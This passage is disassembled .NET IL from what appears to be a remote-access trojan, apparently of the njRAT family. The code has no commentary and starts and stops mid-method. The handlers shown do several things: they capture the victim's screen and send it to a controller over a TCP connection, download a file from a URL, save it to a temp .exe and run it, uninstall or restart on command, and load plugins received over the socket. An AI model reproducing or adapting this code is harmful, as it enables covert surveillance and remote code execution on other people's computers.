      IL_1420:  ldc.i4.0
      IL_1421:  ldstr      "pl"
      IL_1426:  stelem.ref
      IL_1427:  dup
      IL_1428:  ldc.i4.1
      IL_1429:  ldsfld     string j.OK::Y
      IL_142e:  stelem.ref
      IL_142f:  dup
      IL_1430:  ldc.i4.2
      IL_1431:  ldloc.0
      IL_1432:  ldc.i4.1
      IL_1433:  ldelem.ref
      IL_1434:  stelem.ref
      IL_1435:  dup
      IL_1436:  ldc.i4.3
      IL_1437:  ldsfld     string j.OK::Y
      IL_143c:  stelem.ref
      IL_143d:  dup
      IL_143e:  ldc.i4.4
      IL_143f:  ldc.i4.0
      IL_1440:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1445:  stelem.ref
      IL_1446:  call       string [mscorlib]System.String::Concat(string[])
      IL_144b:  call       bool j.OK::Send(string)
      IL_1450:  pop
      IL_1451:  ldloc.s    V_54
      IL_1453:  ldstr      "A"
      IL_1458:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_145d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1462:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1467:  stloc.s    V_55
      IL_1469:  ldc.i4.5
      IL_146a:  newarr     [mscorlib]System.String
      IL_146f:  dup
      IL_1470:  ldc.i4.0
      IL_1471:  ldstr      "ret"
      IL_1476:  stelem.ref
      IL_1477:  dup
      IL_1478:  ldc.i4.1
      IL_1479:  ldsfld     string j.OK::Y
      IL_147e:  stelem.ref
      IL_147f:  dup
      IL_1480:  ldc.i4.2
      IL_1481:  ldloc.0
      IL_1482:  ldc.i4.1
      IL_1483:  ldelem.ref
      IL_1484:  stelem.ref
      IL_1485:  dup
      IL_1486:  ldc.i4.3
      IL_1487:  ldsfld     string j.OK::Y
      IL_148c:  stelem.ref
      IL_148d:  dup
      IL_148e:  ldc.i4.4
      IL_148f:  ldloc.s    V_55
      IL_1491:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1496:  ldnull
      IL_1497:  ldstr      "GT"
      IL_149c:  ldc.i4.0
      IL_149d:  newarr     [mscorlib]System.Object
      IL_14a2:  ldnull
      IL_14a3:  ldnull
      IL_14a4:  ldnull
      IL_14a5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_14aa:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_14af:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_14b4:  stloc.s    V_57
      IL_14b6:  ldloca.s   V_57
      IL_14b8:  call       string j.OK::ENB(string&)
      IL_14bd:  stelem.ref
      IL_14be:  call       string [mscorlib]System.String::Concat(string[])
      IL_14c3:  call       bool j.OK::Send(string)
      IL_14c8:  pop
      IL_14c9:  leave      IL_1ae9

      IL_14ce:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_14d3:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_14d8:  stloc.s    V_58
      IL_14da:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_14df:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_14e4:  stloc.s    V_15
      IL_14e6:  ldloca.s   V_15
      IL_14e8:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_14ed:  ldloca.s   V_58
      IL_14ef:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_14f4:  ldc.i4     0x21005
      IL_14f9:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32,
                                                                                      valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
      IL_14fe:  stloc.s    V_59
      IL_1500:  ldloc.s    V_59
      IL_1502:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_1507:  stloc.s    V_60
      IL_1509:  ldloc.s    V_59
      IL_150b:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_1510:  ldloc.s    V_59
      IL_1512:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_1517:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_151c:  stloc.s    V_61
      IL_151e:  ldloc.s    V_60
      IL_1520:  ldc.i4.0
      IL_1521:  ldc.i4.0
      IL_1522:  ldc.i4.0
      IL_1523:  ldc.i4.0
      IL_1524:  ldloc.s    V_61
      IL_1526:  ldc.i4     0xcc0020
      IL_152b:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      .try
      {
        IL_1530:  ldc.i4.s   32
        IL_1532:  ldc.i4.s   32
        IL_1534:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_1539:  stloc.s    V_61
        IL_153b:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_1540:  ldloc.s    V_61
        IL_1542:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_1547:  stloc.s    V_58
        IL_1549:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_154e:  ldloc.s    V_60
        IL_1550:  ldloc.s    V_58
        IL_1552:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_1557:  leave.s    IL_1574

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1559:  dup
        IL_155a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_155f:  stloc.s    V_66
        IL_1561:  ldloc.s    V_66
        IL_1563:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1568:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_156d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1572:  leave.s    IL_1574

      }  // end handler
      IL_1574:  ldloc.s    V_60
      IL_1576:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_157b:  ldloc.0
      IL_157c:  ldc.i4.1
      IL_157d:  ldelem.ref
      IL_157e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_1583:  ldloc.0
      IL_1584:  ldc.i4.2
      IL_1585:  ldelem.ref
      IL_1586:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_158b:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_1590:  stloc.s    V_62
      IL_1592:  ldloc.s    V_62
      IL_1594:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_1599:  stloc.s    V_60
      IL_159b:  ldloc.s    V_60
      IL_159d:  ldloc.s    V_59
      IL_159f:  ldc.i4.0
      IL_15a0:  ldc.i4.0
      IL_15a1:  ldloc.s    V_62
      IL_15a3:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_15a8:  ldloc.s    V_62
      IL_15aa:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_15af:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawImage(class [System.Drawing]System.Drawing.Image,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32)
      IL_15b4:  ldloc.s    V_60
      IL_15b6:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_15bb:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_15c0:  stloc.s    V_63
      IL_15c2:  ldstr      "CAP"
      IL_15c7:  ldsfld     string j.OK::Y
      IL_15cc:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_15d1:  stloc.s    V_57
      IL_15d3:  ldloca.s   V_57
      IL_15d5:  call       uint8[] j.OK::SB(string&)
      IL_15da:  starg.s    b
      IL_15dc:  ldloc.s    V_63
      IL_15de:  ldarg.0
      IL_15df:  ldc.i4.0
      IL_15e0:  ldarg.0
      IL_15e1:  ldlen
      IL_15e2:  conv.i4
      IL_15e3:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_15e8:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_15ed:  stloc.s    V_64
      IL_15ef:  ldloc.s    V_62
      IL_15f1:  ldloc.s    V_64
      IL_15f3:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
      IL_15f8:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageFormat)
      IL_15fd:  ldloc.s    V_64
      IL_15ff:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1604:  call       string j.OK::md5(uint8[])
      IL_1609:  stloc.s    V_65
      IL_160b:  ldloc.s    V_65
      IL_160d:  ldsfld     string j.OK::lastcap
      IL_1612:  ldc.i4.0
      IL_1613:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1618:  brfalse.s  IL_163a

      IL_161a:  ldloc.s    V_65
      IL_161c:  stsfld     string j.OK::lastcap
      IL_1621:  ldloc.s    V_63
      IL_1623:  ldloc.s    V_64
      IL_1625:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_162a:  ldc.i4.0
      IL_162b:  ldloc.s    V_64
      IL_162d:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_1632:  conv.ovf.i4
      IL_1633:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_1638:  br.s       IL_1642

      IL_163a:  ldloc.s    V_63
      IL_163c:  ldc.i4.0
      IL_163d:  callvirt   instance void [mscorlib]System.IO.MemoryStream::WriteByte(uint8)
      IL_1642:  ldloc.s    V_63
      IL_1644:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1649:  call       bool j.OK::Sendb(uint8[])
      IL_164e:  pop
      IL_164f:  ldloc.s    V_63
      IL_1651:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_1656:  ldloc.s    V_64
      IL_1658:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_165d:  ldloc.s    V_59
      IL_165f:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_1664:  ldloc.s    V_62
      IL_1666:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_166b:  leave      IL_1ae9

      IL_1670:  ldloc.0
      IL_1671:  ldc.i4.1
      IL_1672:  ldelem.ref
      IL_1673:  stloc.s    V_57
      IL_1675:  ldloc.s    V_57
      IL_1677:  ldstr      "~"
      IL_167c:  ldc.i4.0
      IL_167d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1682:  brfalse.s  IL_16a4

      IL_1684:  ldloc.s    V_57
      IL_1686:  ldstr      "!"
      IL_168b:  ldc.i4.0
      IL_168c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1691:  brfalse.s  IL_16ab

      IL_1693:  ldloc.s    V_57
      IL_1695:  ldstr      "@"
      IL_169a:  ldc.i4.0
      IL_169b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_16a0:  brfalse.s  IL_16b8

      IL_16a2:  br.s       IL_16d3

      IL_16a4:  call       void j.OK::UNS()
      IL_16a9:  br.s       IL_16d3

      IL_16ab:  ldc.i4.0
      IL_16ac:  call       void j.OK::pr(int32)
      IL_16b1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_16b6:  br.s       IL_16d3

      IL_16b8:  ldc.i4.0
      IL_16b9:  call       void j.OK::pr(int32)
      IL_16be:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_16c3:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_16c8:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_16cd:  pop
      IL_16ce:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_16d3:  leave      IL_1ae9

      IL_16d8:  ldloc.2
      IL_16d9:  ldstr      "up"
      IL_16de:  ldc.i4.0
      IL_16df:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_16e4:  brtrue     IL_18a1

      IL_16e9:  ldnull
      IL_16ea:  stloc.s    V_6
      IL_16ec:  ldloc.0
      IL_16ed:  ldc.i4.1
      IL_16ee:  ldelem.ref
      IL_16ef:  ldc.i4.0
      IL_16f0:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_16f5:  ldc.i4.s   31
      IL_16f7:  bne.un.s   IL_1775

      .try
      {
        IL_16f9:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_16fe:  ldloc.0
        IL_16ff:  ldc.i4.0
        IL_1700:  ldelem.ref
        IL_1701:  ldsfld     string j.OK::Y
        IL_1706:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_170b:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_1710:  stloc.s    V_67
        IL_1712:  dup
        IL_1713:  ldarg.0
        IL_1714:  ldloc.s    V_67
        IL_1716:  ldarg.0
        IL_1717:  ldlen
        IL_1718:  conv.i4
        IL_1719:  ldloc.s    V_67
        IL_171b:  sub.ovf
        IL_171c:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_1721:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_1726:  call       uint8[] j.OK::ZIP(uint8[])
        IL_172b:  stloc.s    V_6
        IL_172d:  leave      IL_17cd

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1732:  dup
        IL_1733:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1738:  stloc.s    V_68
        IL_173a:  ldloc.s    V_68
        IL_173c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1741:  ldstr      "MSG"
        IL_1746:  ldsfld     string j.OK::Y
        IL_174b:  ldstr      "Update ERROR"
        IL_1750:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_1755:  call       bool j.OK::Send(string)
        IL_175a:  pop
        IL_175b:  ldstr      "bla"
        IL_1760:  call       bool j.OK::Send(string)
        IL_1765:  pop
        IL_1766:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_176b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1770:  leave      IL_1ae9

      }  // end handler
      IL_1775:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_177a:  stloc.s    V_7
      .try
      {
        IL_177c:  ldloc.s    V_7
        IL_177e:  ldloc.0
        IL_177f:  ldc.i4.1
        IL_1780:  ldelem.ref
        IL_1781:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_1786:  stloc.s    V_6
        IL_1788:  leave.s    IL_17cd

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_178a:  dup
        IL_178b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1790:  stloc.s    V_69
        IL_1792:  ldloc.s    V_69
        IL_1794:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1799:  ldstr      "MSG"
        IL_179e:  ldsfld     string j.OK::Y
        IL_17a3:  ldstr      "Update ERROR"
        IL_17a8:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_17ad:  call       bool j.OK::Send(string)
        IL_17b2:  pop
        IL_17b3:  ldstr      "bla"
        IL_17b8:  call       bool j.OK::Send(string)
        IL_17bd:  pop
        IL_17be:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_17c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_17c8:  leave      IL_1ae9

      }  // end handler
      IL_17cd:  ldstr      "bla"
      IL_17d2:  call       bool j.OK::Send(string)
      IL_17d7:  pop
      IL_17d8:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_17dd:  call       valuetype [mscorlib]System.Guid [mscorlib]System.Guid::NewGuid()
      IL_17e2:  stloc.s    V_31
      IL_17e4:  ldloca.s   V_31
      IL_17e6:  constrained. [mscorlib]System.Guid
      IL_17ec:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_17f1:  ldstr      "-"
      IL_17f6:  ldstr      ""
      IL_17fb:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_1800:  ldstr      ".exe"
      IL_1805:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_180a:  stloc.s    V_8
      .try
      {
        IL_180c:  ldstr      "MSG"
        IL_1811:  ldsfld     string j.OK::Y
        IL_1816:  ldstr      "Updating To "
        IL_181b:  ldloc.s    V_8
        IL_181d:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_1822:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_1827:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_182c:  call       bool j.OK::Send(string)
        IL_1831:  pop
        IL_1832:  ldc.i4     0x7d0
        IL_1837:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_183c:  ldloc.s    V_8
        IL_183e:  ldloc.s    V_6
        IL_1840:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_1845:  ldloc.s    V_8
        IL_1847:  ldstr      ".."
        IL_184c:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                                string)
        IL_1851:  pop
        IL_1852:  leave.s    IL_1897

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1854:  dup
        IL_1855:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_185a:  stloc.s    V_70
        IL_185c:  ldloc.s    V_70
        IL_185e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1863:  ldloc.s    V_70
        IL_1865:  stloc.s    V_71
        IL_1867:  ldstr      "MSG"
        IL_186c:  ldsfld     string j.OK::Y
        IL_1871:  ldstr      "Update ERROR "
        IL_1876:  ldloc.s    V_71
        IL_1878:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_187d:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_1882:  call       bool j.OK::Send(string)
        IL_1887:  pop
        IL_1888:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_188d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1892:  leave      IL_1ae9

      }  // end handler
      IL_1897:  call       void j.OK::UNS()
      IL_189c:  leave      IL_1ae9

      IL_18a1:  ldloc.2
      IL_18a2:  ldstr      "Ex"
      IL_18a7:  ldc.i4.0
      IL_18a8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_18ad:  brtrue     IL_1972

      IL_18b2:  ldsfld     object j.OK::PLG
      IL_18b7:  brtrue.s   IL_190b

      IL_18b9:  ldstr      "PLG"
      IL_18be:  call       bool j.OK::Send(string)
      IL_18c3:  pop
      IL_18c4:  ldc.i4.0
      IL_18c5:  stloc.s    V_74
      IL_18c7:  br.s       IL_18d9

      IL_18c9:  ldloc.s    V_74
      IL_18cb:  ldc.i4.1
      IL_18cc:  add.ovf
      IL_18cd:  stloc.s    V_74
      IL_18cf:  ldc.i4     0x3e8
      IL_18d4:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_18d9:  ldsfld     object j.OK::PLG
      IL_18de:  ldnull
      IL_18df:  cgt.un
      IL_18e1:  ldloc.s    V_74
      IL_18e3:  ldc.i4.s   20
      IL_18e5:  ceq
      IL_18e7:  or
      IL_18e8:  ldsfld     bool j.OK::Cn
      IL_18ed:  ldc.i4.0
      IL_18ee:  ceq
      IL_18f0:  or
      IL_18f1:  brfalse.s  IL_18c9

      IL_18f3:  ldsfld     object j.OK::PLG
      IL_18f8:  ldnull
      IL_18f9:  ceq
      IL_18fb:  ldsfld     bool j.OK::Cn
      IL_1900:  ldc.i4.0
      IL_1901:  ceq
      IL_1903:  or
      IL_1904:  brfalse.s  IL_190b

      IL_1906:  leave      IL_1ae9

      IL_190b:  ldc.i4.1
      IL_190c:  newarr     [mscorlib]System.Object
      IL_1911:  dup
      IL_1912:  ldc.i4.0
      IL_1913:  ldarg.0
      IL_1914:  stelem.ref
      IL_1915:  stloc.s    V_72
      IL_1917:  ldc.i4.1
      IL_1918:  newarr     [mscorlib]System.Boolean
      IL_191d:  dup
      IL_191e:  ldc.i4.0
      IL_191f:  ldc.i4.1
      IL_1920:  stelem.i1
      IL_1921:  stloc.s    V_73
      IL_1923:  ldsfld     object j.OK::PLG
      IL_1928:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_192d:  ldnull
      IL_192e:  ldstr      "ind"
      IL_1933:  ldloc.s    V_72
      IL_1935:  ldnull
      IL_1936:  ldnull
      IL_1937:  ldloc.s    V_73
      IL_1939:  ldc.i4.1
      IL_193a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_193f:  pop
      IL_1940:  ldloc.s    V_73
      IL_1942:  ldc.i4.0
      IL_1943:  ldelem.u1
      IL_1944:  brfalse    IL_1a3d

      IL_1949:  ldloc.s    V_72
      IL_194b:  ldc.i4.0
      IL_194c:  ldelem.ref
      IL_194d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1952:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1957:  ldtoken    uint8[]
      IL_195c:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_1961:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_1966:  castclass  uint8[]
      IL_196b:  starg.s    b
      IL_196d:  br         IL_1a3d

      IL_1972:  ldloc.2
      IL_1973:  ldstr      "PLG"
      IL_1978:  ldc.i4.0
      IL_1979:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_197e:  brtrue     IL_1a3d

      IL_1983:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_1988:  ldloc.0
      IL_1989:  ldc.i4.0
      IL_198a:  ldelem.ref
      IL_198b:  ldsfld     string j.OK::Y
      IL_1990:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_1995:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_199a:  stloc.s    V_75
      IL_199c:  dup
      IL_199d:  ldarg.0
      IL_199e:  ldloc.s    V_75
      IL_19a0:  ldarg.0
      IL_19a1:  ldlen
      IL_19a2:  conv.i4
      IL_19a3:  ldloc.s    V_75
      IL_19a5:  sub.ovf
      IL_19a6:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_19ab:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_19b0:  call       uint8[] j.OK::ZIP(uint8[])
      IL_19b5:  ldstr      "A"
      IL_19ba:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_19bf:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_19c4:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_19c9:  stsfld     object j.OK::PLG
      IL_19ce:  ldsfld     object j.OK::PLG
      IL_19d3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_19d8:  ldnull
      IL_19d9:  ldstr      "H"
      IL_19de:  ldc.i4.1
      IL_19df:  newarr     [mscorlib]System.Object
      IL_19e4:  dup
      IL_19e5:  ldc.i4.0
      IL_19e6:  ldsfld     string j.OK::H
      IL_19eb:  stelem.ref
      IL_19ec:  ldnull
      IL_19ed:  ldnull
      IL_19ee:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_19f3:  ldsfld     object j.OK::PLG
      IL_19f8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_19fd:  ldnull
      IL_19fe:  ldstr      "P"
      IL_1a03:  ldc.i4.1
      IL_1a04:  newarr     [mscorlib]System.Object
      IL_1a09:  dup
      IL_1a0a:  ldc.i4.0
      IL_1a0b:  ldsfld     string j.OK::P
      IL_1a10:  stelem.ref
      IL_1a11:  ldnull
      IL_1a12:  ldnull
      IL_1a13:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1a18:  ldsfld     object j.OK::PLG
      IL_1a1d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1a22:  ldnull
      IL_1a23:  ldstr      "c"
      IL_1a28:  ldc.i4.1
      IL_1a29:  newarr     [mscorlib]System.Object
      IL_1a2e:  dup
      IL_1a2f:  ldc.i4.0
      IL_1a30:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_1a35:  stelem.ref
      IL_1a36:  ldnull
      IL_1a37:  ldnull
      IL_1a38:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1a3d:  leave      IL_1ae9

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_1a42:  dup
      IL_1a43:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_1a48:  stloc.s    V_76
      IL_1a4a:  ldloc.s    V_76
